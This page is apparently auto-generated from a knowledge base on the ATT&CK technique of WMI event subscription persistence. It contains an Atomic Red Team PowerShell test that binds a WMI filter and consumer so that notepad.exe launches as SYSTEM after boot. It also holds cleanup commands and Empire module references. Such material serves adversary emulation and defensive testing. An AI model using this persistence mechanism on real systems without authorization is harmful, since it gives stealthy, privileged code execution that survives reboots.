
# Windows Management Instrumentation Event Subscription

## Description

### MITRE Description

> Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts into Windows Management Object (MOF) files (.mof extension). (Citation: Dell WMI Persistence) Examples of events that may be subscribed to are the wall clock time or the computer's uptime. (Citation: Kazanciyan 2014) Several threat groups have reportedly used this technique to maintain persistence. (Citation: Mandiant M-Trends 2015)

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1084

## Potential Commands

```
$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
                CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs

powershell/persistence/elevated/wmi_updater
powershell/persistence/elevated/wmi_updater
```

## Commands Dataset

```
[{'command': "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n"
             "                EventNameSpace='root\\CimV2';\n"
             '                QueryLanguage="WQL";\n'
             '                Query="SELECT * FROM __InstanceModificationEvent '
             'WITHIN 60 WHERE TargetInstance ISA '
             "'Win32_PerfFormattedData_PerfOS_System' AND "
             'TargetInstance.SystemUpTime >= 240 AND '
             'TargetInstance.SystemUpTime < 325"};\n'
             '$Filter=New-CimInstance -Namespace root/subscription -ClassName '
             '__EventFilter -Property $FilterArgs\n'
             '\n'
             "$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n"
             '                '
             'CommandLineTemplate="$($Env:SystemRoot)\\System32\\notepad.exe";}\n'
             '$Consumer=New-CimInstance -Namespace root/subscription '
             '-ClassName CommandLineEventConsumer -Property $ConsumerArgs\n'
             '\n'
             '$FilterToConsumerArgs = @{\n'
             'Filter = [Ref] $Filter;\n'
             'Consumer = [Ref] $Consumer;\n'
             '}\n'
             '$FilterToConsumerBinding = New-CimInstance -Namespace '
             'root/subscription -ClassName __FilterToConsumerBinding -Property '
             '$FilterToConsumerArgs\n',
  'name': None,
  'source': 'atomics/T1084/T1084.yaml'},
 {'command': 'powershell/persistence/elevated/wmi_updater',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/elevated/wmi_updater',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Windows Management Instrumentation Event Subscription': {'atomic_tests': [{'description': 'Run '
                                                                                                                    'from '
                                                                                                                    'an '
                                                                                                                    'administrator '
                                                                                                                    'powershell '
                                                                                                                    'window. '
                                                                                                                    'After '
                                                                                                                    'running, '
                                                                                                                    'reboot '
                                                                                                                    'the '
                                                                                                                    'victim '
                                                                                                                    'machine.\n'
                                                                                                                    'After '
                                                                                                                    'it '
                                                                                                                    'has '
                                                                                                                    'been '
                                                                                                                    'online '
                                                                                                                    'for '
                                                                                                                    '4 '
                                                                                                                    'minutes '
                                                                                                                    'you '
                                                                                                                    'should '
                                                                                                                    'see '
                                                                                                                    'notepad.exe '
                                                                                                                    'running '
                                                                                                                    'as '
                                                                                                                    'SYSTEM.\n'
                                                                                                                    '\n'
                                                                                                                    'Code '
                                                                                                                    'references\n'
                                                                                                                    '\n'
                                                                                                                    'https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n'
                                                                                                                    '\n'
                                                                                                                    'https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n',
                                                                                                     'executor': {'cleanup_command': '$EventConsumerToCleanup '
                                                                                                                                     '= '
                                                                                                                                     'Get-WmiObject '
                                                                                                                                     '-Namespace '
                                                                                                                                     'root/subscription '
                                                                                                                                     '-Class '
                                                                                                                                     'CommandLineEventConsumer '
                                                                                                                                     '-Filter '
                                                                                                                                     '"Name '
                                                                                                                                     '= '
                                                                                                                                     '\'AtomicRedTeam-WMIPersistence-Example\'"\n'
                                                                                                                                     '$EventFilterToCleanup '
                                                                                                                                     '= '
                                                                                                                                     'Get-WmiObject '
                                                                                                                                     '-Namespace '
                                                                                                                                     'root/subscription '
                                                                                                                                     '-Class '
                                                                                                                                     '__EventFilter '
                                                                                                                                     '-Filter '
                                                                                                                                     '"Name '
                                                                                                                                     '= '
                                                                                                                                     '\'AtomicRedTeam-WMIPersistence-Example\'"\n'
                                                                                                                                     '$FilterConsumerBindingToCleanup '
                                                                                                                                     '= '
                                                                                                                                     'Get-WmiObject '
                                                                                                                                     '-Namespace '
                                                                                                                                     'root/subscription '
                                                                                                                                     '-Query '
                                                                                                                                     '"REFERENCES '
                                                                                                                                     'OF '
                                                                                                                                     '{$($EventConsumerToCleanup.__RELPATH)} '
                                                                                                                                     'WHERE '
                                                                                                                                     'ResultClass '
                                                                                                                                     '= '
                                                                                                                                     '__FilterToConsumerBinding" '
                                                                                                                                     '-ErrorAction '
                                                                                                                                     'SilentlyContinue\n'
                                                                                                                                     '$FilterConsumerBindingToCleanup '
                                                                                                                                     '| '
                                                                                                                                     'Remove-WmiObject\n'
                                                                                                                                     '$EventConsumerToCleanup '
                                                                                                                                     '| '
                                                                                                                                     'Remove-WmiObject\n'
                                                                                                                                     '$EventFilterToCleanup '
                                                                                                                                     '| '
                                                                                                                                     'Remove-WmiObject\n',
                                                                                                                  'command': '$FilterArgs '
                                                                                                                             '= '
                                                                                                                             "@{name='AtomicRedTeam-WMIPersistence-Example';\n"
                                                                                                                             '                '
                                                                                                                             "EventNameSpace='root\\CimV2';\n"
                                                                                                                             '                '
                                                                                                                             'QueryLanguage="WQL";\n'
                                                                                                                             '                '
                                                                                                                             'Query="SELECT '
                                                                                                                             '* '
                                                                                                                             'FROM '
                                                                                                                             '__InstanceModificationEvent '
                                                                                                                             'WITHIN '
                                                                                                                             '60 '
                                                                                                                             'WHERE '
                                                                                                                             'TargetInstance '
                                                                                                                             'ISA '
                                                                                                                             "'Win32_PerfFormattedData_PerfOS_System' "
                                                                                                                             'AND '
                                                                                                                             'TargetInstance.SystemUpTime '
                                                                                                                             '>= '
                                                                                                                             '240 '
                                                                                                                             'AND '
                                                                                                                             'TargetInstance.SystemUpTime '
                                                                                                                             '< '
                                                                                                                             '325"};\n'
                                                                                                                             '$Filter=New-CimInstance '
                                                                                                                             '-Namespace '
                                                                                                                             'root/subscription '
                                                                                                                             '-ClassName '
                                                                                                                             '__EventFilter '
                                                                                                                             '-Property '
                                                                                                                             '$FilterArgs\n'
                                                                                                                             '\n'
                                                                                                                             '$ConsumerArgs '
                                                                                                                             '= '
                                                                                                                             "@{name='AtomicRedTeam-WMIPersistence-Example';\n"
                                                                                                                             '                '
                                                                                                                             'CommandLineTemplate="$($Env:SystemRoot)\\System32\\notepad.exe";}\n'
                                                                                                                             '$Consumer=New-CimInstance '
                                                                                                                             '-Namespace '
                                                                                                                             'root/subscription '
                                                                                                                             '-ClassName '
                                                                                                                             'CommandLineEventConsumer '
                                                                                                                             '-Property '
                                                                                                                             '$ConsumerArgs\n'
                                                                                                                             '\n'
                                                                                                                             '$FilterToConsumerArgs '
                                                                                                                             '= '
                                                                                                                             '@{\n'
                                                                                                                             'Filter '
                                                                                                                             '= '
                                                                                                                             '[Ref] '
                                                                                                                             '$Filter;\n'
                                                                                                                             'Consumer '
                                                                                                                             '= '
                                                                                                                             '[Ref] '
                                                                                                                             '$Consumer;\n'
                                                                                                                             '}\n'
                                                                                                                             '$FilterToConsumerBinding '
                                                                                                                             '= '
                                                                                                                             'New-CimInstance '
                                                                                                                             '-Namespace '
                                                                                                                             'root/subscription '
                                                                                                                             '-ClassName '
                                                                                                                             '__FilterToConsumerBinding '
                                                                                                                             '-Property '
                                                                                                                             '$FilterToConsumerArgs\n',
                                                                                                                  'elevation_required': True,
                                                                                                                  'name': 'powershell'},
                                                                                                     'name': 'Persistence '
                                                                                                             'via '
                                                                                                             'WMI '
                                                                                                             'Event '
                                                                                                             'Subscription',
                                                                                                     'supported_platforms': ['windows']}],
                                                                                   'attack_technique': 'T1084',
                                                                                   'display_name': 'Windows '
                                                                                                   'Management '
                                                                                                   'Instrumentation '
                                                                                                   'Event '
                                                                                                   'Subscription'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1084',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/persistence/elevated/wmi_updater":  '
                                                                                 '["T1084"],',
                                            'Empire Module': 'powershell/persistence/elevated/wmi_updater',
                                            'Technique': 'Windows Management '
                                                         'Instrumentation '
                                                         'Event Subscription'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)


# Mitigations

None

# Actors


* [APT29](../actors/APT29.md)

* [Leviathan](../actors/Leviathan.md)
    
* [Turla](../actors/Turla.md)
    
